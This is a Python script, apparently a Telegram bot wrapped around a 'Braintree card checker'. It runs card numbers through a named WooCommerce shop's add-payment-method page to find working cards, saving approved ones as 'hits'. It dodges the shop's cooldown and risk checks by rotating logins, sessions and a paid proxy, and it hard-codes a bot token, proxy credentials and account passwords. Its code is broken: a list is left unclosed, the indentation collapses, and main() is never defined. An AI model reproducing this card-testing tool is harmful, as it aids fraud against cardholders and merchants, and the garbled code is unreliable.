#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Telegram bot + Braintree card checker for kaffn8.com

Required environment variable (set in Render → Settings → Environment):
    TELEGRAM_TOKEN = "9293641988:AAGiI_l_TKp9bxwx-7oDAAClrwK6QiYPgJs"

Optional overrides (all have sensible defaults):
    VERBOSE, THREADS, CONNECT_TIMEOUT, READ_TIMEOUT, CONTEXT_TTL,
    BRAINTREE_DIRECT, SHOW_IP
"""

# ──────────────────────────────────────────────────────────────────────
# STANDARD LIBRARY IMPORTS
# ──────────────────────────────────────────────────────────────────────
import os
import re
import time
import json
import base64
import uuid
import threading
import ctypes
from typing import Optional, Tuple, List, Dict, Any

# ──────────────────────────────────────────────────────────────────────
# THIRD‑PARTY IMPORTS
# ──────────────────────────────────────────────────────────────────────
import requests
from requests.adapters import HTTPAdapter
from telegram import Update
from telegram.ext import (
    Application,
    CommandHandler,
    ContextTypes,
)

# ──────────────────────────────────────────────────────────────────────
# BOT TOKEN  (READ FROM ENV – FAIL FAST IF MISSING)
# ──────────────────────────────────────────────────────────────────────
TOKEN = os.getenv("TELEGRAM_TOKEN")
if not TOKEN:
    raise RuntimeError(
        "❗️ Environment variable TELEGRAM_TOKEN is not set. "
        "Add it in Render → Settings → Environment (or in a local .env file)."
    )

# ──────────────────────────────────────────────────────────────────────
# TELEGRAM HANDLERS
# ──────────────────────────────────────────────────────────────────────
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "Bot is online.\n\n"
        "Commands:\n"
        "/status - Check bot status\n"
        "/help - Show commands"
    )


async def status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("✅ Bot is running.")


async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "/start - Start the bot\n"
        "/status - Check status\n"
        "/help - Show this message"
    )


def run_telegram_bot():
    """Entry‑point used by the main guard."""
    app = Application.builder().token(TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("status", status))
    app.add_handler(CommandHandler("help", help_command))
    print("🚀 Telegram bot running...")
    app.run_polling()


# ──────────────────────────────────────────────────────────────────────
# ACCOUNTS  (EDIT THIS LIST IF YOU NEED MORE)
# ──────────────────────────────────────────────────────────────────────
ACCOUNTS: List[Dict[str, str]] = [
    {"login": "Kingkyot",  "password": "Kingpogi123"},
    {"login": "Kingkyot1", "password": "Kingpogi123"},
    {"login": "Kingkyot2", "password": "Kingpogi123"},
]

# ──────────────────────────────────────────────────────────────────────
# GLOBAL CONFIG  (OVERRIDABLE VIA ENV VARS)
# ──────────────────────────────────────────────────────────────────────
VERBOSE           = os.environ.get("VERBOSE", "0") == "1"
THREADS           = int(os.environ.get("THREADS", "10"))
CONNECT_TIMEOUT   = float(os.environ.get("CONNECT_TIMEOUT", "6"))
READ_TIMEOUT      = float(os.environ.get("READ_TIMEOUT", "12"))
CONTEXT_TTL       = float(os.environ.get("CONTEXT_TTL", "600"))
BRAINTREE_DIRECT  = os.environ.get("BRAINTREE_DIRECT", "1") == "1"
SHOW_IP           = os.environ.get("SHOW_IP", "1") == "1"

BASE_URL               = "https://www.kaffn8.com"
ACCOUNT_URL            = f"{BASE_URL}/my-account/"
ADD_PAYMENT_URL        = f"{BASE_URL}/my-account/add-payment-method/"
AJAX_URL               = f"{BASE_URL}/wp-admin/admin-ajax.php"
BRAINTREE_GRAPHQL_URL  = "https://payments.braintreegateway.com/graphql"

UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/154.0.0.0 Safari/537.36")

RISK_TRIGGER     = "risk threshold"
COOLDOWN_TRIGGER = "so soon after the previous one"
COOLDOWN_SECONDS = 21

AVS_TRIGGERS = ("gateway rejected: avs", "status code avs")

MAX_ACCOUNT_ROTATIONS = len(ACCOUNTS)
MAX_ATTEMPTS          = 6

PROXY       = "brd.superproxy.io:44445"
PROXY_AUTH  = "brd-customer-hl_d903488e-zone-keng:nhe38omwsdsv"
PROXIES     = {
    "http":  f"http://{PROXY_AUTH}@{PROXY}",
    "https": f"http://{PROXY_AUTH}@{PROXY}",
}

os.makedirs("hits", exist_ok=True)

BRAINTREE_TEST_CARDS = [
    "4111111111111111|12|2035|123",
    "4000056655665556|12|2035|123",
    "5555555555554444|12|2035|123",
    "378282246310005|12|2035|123",
    "6011111111111117|12|2035|123",
    "3530111333300000|12|2035|123",
]

# ──────────────────────────────────────────────────────────────────────
# THREAD‑SAFE PRINT / STATS HELPERS
# ──────────────────────────────────────────────────────────────────────
PRINT_LOCK = threading.Lock()
HIT_LOCK   = threading.Lock()
_ACC_LOCK  = threading.Lock()
_ACC_IDX   = 0


def log_debug(msg: str):
    if VERBOSE:
        with PRINT_LOCK:
            print(msg)


def print_result(creditcard: str, label: str, message: str, ip_address: Optional[str] = None):
    clean = str(message).replace("\n", " ").strip()
    ip_text = f" | IP {ip_address}" if ip_address else ""
    if clean.lower() in {"payment method added successfully", "success", "ok", "pass"}:
        line = f"{creditcard}{ip_text} | {label}"
    else:
        line = f"{creditcard}{ip_text} | {label} | {clean}"
    with PRINT_LOCK:
        print(f"\r{line}{' ' * 8}")


def save_hit(filename: str, creditcard: str, message: str, ip_address: Optional[str]):
    try:
        with HIT_LOCK:
            with open(os.path.join("hits", filename), "a", encoding="utf-8") as fh:
                fh.write(f"{creditcard} | {message} | {ip_address or '-'}\n")
    except Exception:
        pass


def update_status(stats_obj=None):
    stats_obj = stats_obj or STATS
    h, a, c, f, _, _ = stats_obj.snapshot()
    try:
        ctypes.windll.kernel32.SetConsoleTitleW(
            f'hits: {h} | avs: {a} | custom: {c} | fail: {f}')
    except Exception:
        pass


class Stats:
    def __init__(self):
        self.lock = threading.Lock()
        self.hits = 0
        self.avs = 0
        self.custom = 0
        self.fail = 0
        self.done = 0
        self.total = 0
        self.start = time.time()

    def bump(self, kind: str):
        with self.lock:
            setattr(self, kind, getattr(self, kind) + 1)
            self.done += 1
        update_status(self)

    def snapshot(self) -> Tuple[int, int, int, int, int, int]:
        with self.lock:
            return self.hits, self.avs, self.custom, self.fail, self.done, self.total


STATS = Stats()


def classify(message: str) -> Tuple[str, str]:
    """Return ('hit'|'avs'|'custom'|'fail', LABEL)."""
    low = message.lower()
    if any(t in low for t in AVS_TRIGGERS) or re.search(r'\bavs\b', low):
        return "avs", "AVS"
    if "success" in low or "added" in low:
        return "hit", "PASS"
    if RISK_TRIGGER in low:
        return "custom", "FAIL"
    return "fail", "FAIL"


def next_account(exclude=()):
    """Return the next account in the rotation, skipping the excluded logins."""
    global _ACC_IDX
    n = len(ACCOUNTS)
    if n == 0:
        return None
    with _ACC_LOCK:
        for _ in range(n):
            acc = ACCOUNTS[_ACC_IDX % n]
            _ACC_IDX += 1
            if acc["login"] not in exclude:
                return dict(acc)
        return dict(ACCOUNTS[_ACC_IDX % n])


# ──────────────────────────────────────────────────────────────────────
# HTTP HELPERS
# ──────────────────────────────────────────────────────────────────────
def make_session(proxied: bool = True) -> requests.Session:
    s = requests.Session()
    s.trust_env = False
    if proxied:
        s.proxies.update(PROXIES)
    adapter = HTTPAdapter(
        pool_connections=max(THREADS * 2, 20),
        pool_maxsize=max(THREADS * 2, 20),
        max_retries=0,
    )
    s.mount("https://", adapter)
    s.mount("http://", adapter)
    return s


def request(session: requests.Session, method: str, url: str, retries: int = 2, **kwargs):
    kwargs.setdefault("timeout", (CONNECT_TIMEOUT, READ_TIMEOUT))
    last_exc = None
    for i in range(retries + 1):
        try:
            r = session.request(method, url, **kwargs)
            if r.status_code >= 500 and i < retries:
                time.sleep(0.25 * (i + 1))
                continue
            return r
        except Exception as e:
            last_exc = e
            if i < retries:
                time.sleep(0.25 * (i + 1))
    raise last_exc


def build_headers(referer: Optional[str] = None,
                  content_type: Optional[str] = None,
                  extra: Optional[dict] = None,
                  ajax: bool = False) -> dict:
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.5',
        'user-agent': UA,
        'sec-ch-ua': '"Chromium";v="154", "Brave";v="154", "Not A(Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-gpc': '1',
    }
    if ajax:
        headers.update({
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'x-requested-with': 'XMLHttpRequest',
        })
    if referer:
        headers['referer'] = referer
    if content_type:
        headers['content-type'] = content_type
    if extra:
        headers.update(extra)
    return headers


# ──────────────────────────────────────────────────────────────────────
# LIGHTWEIGHT HTML PARSING
# ──────────────────────────────────────────────────────────────────────
def find_nonce(html: str, name: str) -> Optional[str]:
    pat = re.escape(name)
    m = re.search(rf'name=["\']{pat}["\'][^>]*?value=["\']([^"\']+)', html)
    if not m:
        m = re.search(rf'value=["\']([^"\']+)["\'][^>]*?name=["\']{pat}["\']', html)
    return m.group(1) if m else None


def strip_tags(s: str) -> str:
    return re.sub(r'\s+', ' ', re.sub(r'<[^>]+>', ' ', s)).strip()


def extract_errors(html: str) -> List[str]:
    out = []
    for block in re.findall(r'<ul[^>]*class="[^"]*woocommerce-error[^"]*"[^>]*>(.*?)</ul>', html, re.S | re.I):
        out.extend(strip_tags(li) for li in re.findall(r'<li[^>]*>(.*?)</li>', block, re.S | re.I))
    return [e for e in out if e]


def extract_success(html: str) -> Optional[str]:
    m = re.search(r'<div[^>]*class="[^"]*woocommerce-message[^"]*"[^>]*>(.*?)</div>', html, re.S | re.I)
    return strip_tags(m.group(1)) if m else None


def is_logged_in(html: str) -> bool:
    return ("Log out" in html) or ("Dashboard" in html) or ("woocommerce-MyAccount-navigation" in html)


def parse_card(card: str) -> Optional[Tuple[str, str, str, str]]:
    parts = card.split("|")
    if len(parts) == 3:
        return parts[0], parts[1], parts[2], ""
    if len(parts) == 4:
        return parts[0], parts[1], parts[2], parts[3]
    return None


# ──────────────────────────────────────────────────────────────────────
# WORKER CLASS (Core Checking Logic)
# ──────────────────────────────────────────────────────────────────────
class Worker:
    def __init__(self):
        self.session = make_session(proxied=True)
        self.direct = self.session if not BRAINTREE_DIRECT else make_session(proxied=False)
        self.account = None
        self.logged_in = False
        self.context_valid = False
        self.context_time = 0.0
        self.woo_nonce = None
        self.fingerprint = None
        self.tried = set()
        self.ip = None
        if SHOW_IP:
            try:
                r = request(self.session, "GET", "https://api.ipify.org/?format=json",
                            headers={"user-agent": UA, "accept": "*/*"})
                self.ip = json.loads(r.text)["ip"]
            except Exception:
                self.ip = None

    # -- session ------------------------------------------------------------
    def fresh_session(self):
        """Brand new cookie jar: clears the WooCommerce 20s add-payment cooldown."""
        try:
            self.session.close()
        except Exception:
            pass
        self.session = make_session(proxied=True)
        self.logged_in = False
        self.context_valid = False

    def rotate(self):
        """Move to the next account in the list and start a clean session."""
        acc = next_account(exclude=self.tried)
        if acc is None:
            return False
        self.tried.add(acc["login"])
        self.account = acc
        self.fresh_session()
        return True

    # -- login --------------------------------------------------------------
    def login(self, account):
        r = request(self.session, "GET", ACCOUNT_URL, headers=build_headers())
        if is_logged_in(r.text):
            return True
        nonce = find_nonce(r.text, "woocommerce-login-nonce")
        if not nonce:
            return False
        data = {
            "username": account["login"],
            "password": account["password"],
            "rememberme": "forever",
            "woocommerce-login-nonce": nonce,
            "_wp_http_referer": "/my-account/",
            "login": "Log in",
        }
        r2 = request(self.session, "POST", ACCOUNT_URL,
                     headers=build_headers(
                         referer=ACCOUNT_URL, content_type="application/x-www-form-urlencoded"), data=data)
        return is_logged_in(r2.text)

    # -- cached context -----------------------------------------------------
    def ensure_context(self, force=False):
        if not force and self.context_valid and (time.time() - self.context_time) < CONTEXT_TTL:
            return
        r = request(self.session, "GET", ADD_PAYMENT_URL,
                    headers=build_headers(referer=f"{BASE_URL}/my-account/payment-methods/"))

        woo_nonce = find_nonce(r.text, "woocommerce-add-payment-method-nonce")
        token_nonce = find_nonce(r.text, "client_token_nonce")
        if not token_nonce:
            m = re.search(r'"client_token_nonce"\s*:\s*"([^"]+)"', r.text)
            token_nonce = m.group(1) if m else None
        if not woo_nonce or not token_nonce:
            raise Exception("add-payment nonces missing")

        ajax_headers = build_headers(
            referer=ADD_PAYMENT_URL,
            content_type="application/x-www-form-urlencoded; charset=UTF-8",
            ajax=True,
            extra={"origin": BASE_URL, "priority": "u=1, i"},
        )
        r2 = request(self.session, "POST", AJAX_URL, headers=ajax_headers,
                     data={"action": "wc_braintree_credit_card_get_client_token", "nonce": token_nonce})
        payload = r2.json()
        client_token = payload.get("data")
        if isinstance(client_token, dict):
            client_token = client_token.get("clientToken", "")
        if not client_token:
            raise Exception("empty client token")

        self.fingerprint = json.loads(base64.b64decode(client_token))["authorizationFingerprint"]
        self.woo_nonce = woo_nonce
        self.ip = self.ip  # keep IP from earlier check
        self.woo_nonce = woo_nonce
        self.context_valid = True
        self.context_time = time.time()

    # -- tokenize -----------------------------------------------------------
    def tokenize(self, number, month, year, cvv):
        graphql_headers = {
            "accept": "*/*",
            "accept-language": "en-US,en;q=0.5",
            "authorization": f"Bearer {self.fingerprint}",
            "braintree-version": "2018-05-10",
            "content-type": "application/json",
            "origin": "https://assets.braintreegateway.com",
            "referer": "https://assets.braintreegateway.com/",
            "user-agent": UA,
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "cross-site",
        }
        query = """
mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {
  tokenizeCreditCard(input: $input) { token creditCard { bin brandCode last4 } }
}"""
        card_input = {"number": number, "expirationMonth": month, "expirationYear": year}
        if cvv:
            card_input["cvv"] = cvv
        body = {
            "clientSdkMetadata": {"source": "client", "integration": "custom",
                                  "sessionId": str(uuid.uuid4())},
            "query": query,
            "variables": {"input": {"creditCard": card_input, "options": {"validate": False}}},
            "operationName": "TokenizeCreditCard",
        }
        r = request(self.direct, "POST", BRAINTREE_GRAPHQL_URL, headers=graphql_headers, json=body)
        data = r.json()
        if "errors" in data:
            raise Exception(f"Braintree errors: {data['errors']}")
        return data["data"]["tokenizeCreditCard"]["token"]

    # -- submit -------------------------------------------------------------
    def submit_card(self, card):
        parsed = parse_card(card)
        if not parsed:
            return "Invalid card format"
        token = self.tokenize(*parsed)

        submit_headers = build_headers(
            referer=ADD_PAYMENT_URL,
            content_type="application/x-www-form-urlencoded",
            extra={
                "cache-control": "max-age=0",
                "origin": BASE_URL,
                "priority": "u=0, i",
                "sec-fetch-user": "?1",
                "upgrade-insecure-requests": "1",
            },
        )
        data = [
            ("payment_method", "braintree_credit_card"),
            ("wc-braintree-credit-card-card-type", "visa"),
            ("wc-braintree-credit-card-3d-secure-enabled", ""),
            ("wc-braintree-credit-card-3d-secure-verified", ""),
            ("wc-braintree-credit-card-3d-secure-order-total", "0.00"),
            ("wc_braintree_credit_card_payment_nonce", token),
            ("wc_braintree_device_data", json.dumps({"correlation_id": str(uuid.uuid4())})),
            ("wc-braintree-credit-card-tokenize-payment-method", "true"),
            ("wc_braintree_paypal_payment_nonce", ""),
            ("wc_braintree_paypal_context", "shortcode"),

        r = request(self.session, "POST", ADD_PAYMENT_URL, headers=submit_headers, data=data)

    errors = extract_errors(r.text)
    if errors:
        return "; ".join(errors)
    msg = extract_success(r.text)
    if msg:
        return msg
    m = re.search(r"(?i)(declined|error|invalid|failed|problem|risk|avs|cvv|so soon)[^<]{0,200}", r.text)
    return m.group(0).strip() if m else "Unknown decline"


# ──────────────────────────────────────────────────────────────────────
# MAIN ENTRY POINT
# ──────────────────────────────────────────────────────────────────────
if __name__ == "__main__":
    main()
